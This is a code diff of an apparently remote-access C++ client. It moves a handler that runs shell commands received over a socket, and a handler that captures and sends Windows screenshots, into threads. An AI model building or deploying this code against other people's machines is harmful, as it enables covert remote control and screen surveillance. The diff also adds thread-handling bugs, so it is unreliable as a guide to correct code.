@@ -2,7 +2,7 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-06 20:00:36
+* @Last Modified time: 2017-04-08 10:08:01
 */
 
 #include <vector>
@@ -193,19 +193,29 @@ void register_device(int socket, string recv_uid)
     write(socket, uid.c_str(), uid.size());
 }
 
-void execute_cmd(int socket, const string cmd)
+struct cmd_args
+{
+    int socket;
+    string cmd;
+};
+
+void *execute_cmd(void* arguments)
 {
     int len;
     FILE *pPipe;
     char buffer[150];
+    struct cmd_args *args;
+
+    args = (struct cmd_args *)arguments;
+    cout << args->cmd << endl;
 
     fflush(stdin);
-    pPipe = popen(cmd.c_str(), "r");
+    pPipe = popen(args->cmd.c_str(), "r");
     if (pPipe == NULL)
     {
         sprintf(buffer, "RSP%07dFailed to create pipe!", 0);
-        send_request(socket, buffer, strlen(buffer), true);
-        return;
+        send_request(args->socket, buffer, strlen(buffer), true);
+        return NULL;
     }
 
     /* we want this data to be contigous */
@@ -219,14 +229,14 @@ void execute_cmd(int socket, const string cmd)
         str = buffer;
         len = strlen(buffer) + 10;
         sprintf(buffer, "RSP%07d%s", len, str.c_str());
-        send_request(socket, buffer, len, false);
+        send_request(args->socket, buffer, len, false);
     }
 
     // unlock socket write stream
     pthread_mutex_unlock(&mutex_socket);
 
     pclose(pPipe);
-    return;
+    return NULL;
 }
 
 /* https://msdn.microsoft.com/en-us/library/windows/desktop/ms533843(v=vs.85).aspx */
@@ -259,16 +269,19 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
     return -1;
 }
 
-void get_screenshot(int socket)
+void *get_screenshot(void* arguments)
 {
     CLSID clsid;
     ULONG quality;
     int width, height;
     HDC screenDC, memDC;
+    struct cmd_args *args;
     HBITMAP memBit, oldbit;
     ULONG_PTR gdiplusToken;
     EncoderParameters encoderParameters;
     GdiplusStartupInput gdiplusStartupInput;
+
+    args = (struct cmd_args *)arguments;
 
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
@@ -314,15 +327,16 @@ void get_screenshot(int socket)
     // lock socket write stream
     pthread_mutex_lock(&mutex_socket);
 
-    send_request(socket, buffer, strlen(buffer), false);
+    send_request(args->socket, buffer, strlen(buffer), false);
     for (int i = 0; i < size2read; i += 1000)
     {
         pStream->Read(buffer, 1000, &bytesRead);
-        send_request(socket, buffer, bytesRead, false);
+        send_request(args->socket, buffer, bytesRead, false);
     }
 
     // unlock socket write stream
     pthread_mutex_unlock(&mutex_socket);
+    return NULL;
 }
 
 int main(int argc, char *argv[])
@@ -331,9 +345,10 @@ int main(int argc, char *argv[])
     string cmd, req;
     vector<char> buffer(1030);
     struct sockaddr_in addr;
+    struct cmd_args cmdargs;
     fd_set active_fd_set, read_fd_set;
 
-    pthread_t logger_thread;
+    pthread_t logger_thread, cmd_thread;
 
     /* create socket */
     sock = socket(AF_INET , SOCK_STREAM , 0);
@@ -444,13 +459,19 @@ int main(int argc, char *argv[])
 
                         req = cmd.substr(3, 4);
 
+                        if (pthread_cancel(cmd_thread))
+                            printf("Failed to kill previous thread\n");
+
+                        cmdargs.socket = sock;
+                        cmdargs.cmd = cmd.substr(7);
+
                         if (req == "SSCR")
                             /* get screenshot */
-                            get_screenshot(sock);
+                            pthread_create(&cmd_thread, NULL, &get_screenshot, &cmdargs);
 
                         else if (req == "EXEC")
                             /* command to execute */
-                            execute_cmd(sock, cmd.substr(7));
+                            pthread_create(&cmd_thread, NULL, &execute_cmd, &cmdargs);
                     }
                     else if (req == "ACK")
                     {
